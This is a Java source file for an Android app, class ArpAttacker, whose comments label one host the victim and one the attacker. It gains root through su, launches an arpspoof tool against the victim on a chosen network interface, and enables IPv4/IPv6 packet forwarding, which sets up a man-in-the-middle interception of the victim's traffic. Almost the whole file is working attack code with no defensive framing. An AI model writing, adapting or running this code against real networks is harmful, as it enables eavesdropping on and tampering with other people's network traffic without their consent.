package module;

import android.content.Context;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;

import utils.FileUtils;

/**
 * Created by zhaoqc on 17-7-22.
 */

public class ArpAttacker {

    private Context mContext;
    private String hostA = null;       //受害者
    private String hostB = null;     //攻击者
    private String networkInterface = null;    //网卡接口
    private String toolPath = null;     //工具路径
    private String pkillPath = null;

    private Thread attackerThread = null;

    public ArpAttacker(Context context) {
        this.mContext = context;
    }

    public void setHostA(String hostA) {
        this.hostA = hostA;
    }

    public void setHostB(String hostB) {
        this.hostB = hostB;
    }

    public void setNetworkInterface(String networkInterface) {
        this.networkInterface = networkInterface;
    }

    public void setToolPath(String path) {
        this.toolPath = path;
    }

    public void setPkillPath(String path) {
        this.pkillPath = path;
    }

    public void start() {
        attackerThread = new Thread() {
            @Override
            public void run() {
                if(hostA != null
                        && hostB != null
                        && networkInterface != null
                        && toolPath != null
                        && FileUtils.isFileExist(mContext,toolPath)) {
                    try {
                        Process p = Runtime .getRuntime().exec("su");
                        DataOutputStream os = new DataOutputStream(p.getOutputStream());
                        os.writeBytes(toolPath + " -i " + networkInterface + " -t " + hostA + " " + hostB + "\n");
                        os.flush();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        };
        attackerThread.start();
    }

    public void stop() {
        new Thread() {
            @Override
            public void run() {
                try {
                    Process p = Runtime.getRuntime().exec("su");
                    DataOutputStream os = new DataOutputStream(p.getOutputStream());
                    os.writeBytes(pkillPath + " -SIGINT arpspoof\n");
                    os.writeBytes("exit\n");
                    os.flush();
                    p.waitFor();

                    if(attackerThread != null)
                        attackerThread.interrupt();
                    attackerThread = null;

                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    public boolean isRunning() {
        if(attackerThread != null)
            return true;
        else
            return false;
    }

    //允许包转发
    public void enableTransmit(final boolean on) {
        new Thread() {
            @Override
            public void run() {
                if(on) {
                    try {
                        Process p = Runtime.getRuntime().exec("su");
                        DataOutputStream os = new DataOutputStream(p.getOutputStream());
                        os.writeBytes("echo 1 > /proc/sys/net/ipv4/ip_forward\n");
                        os.writeBytes("echo 1 > /proc/sys/net/ipv6/ip_forward\n");
                        os.writeBytes("exit\n");
                        os.flush();
                        p.waitFor();
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                } else {
                    try {
                        Process p = Runtime.getRuntime().exec("su");
                        DataOutputStream os = new DataOutputStream(p.getOutputStream());
                        os.writeBytes("echo 0 > /proc/sys/net/ipv4/ip_forward\n");
                        os.writeBytes("echo 0 > /proc/sys/net/ipv6/ip_forward\n");
                        os.writeBytes("exit\n");
                        os.flush();
                        p.waitFor();
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }

    public String getHostA() {
        if(this.hostA != null)
            return this.hostA;
        else
            return "";
    }

    public String getHostB() {
        if(this.hostA != null)
            return this.hostB;
        else
            return "";
    }
}
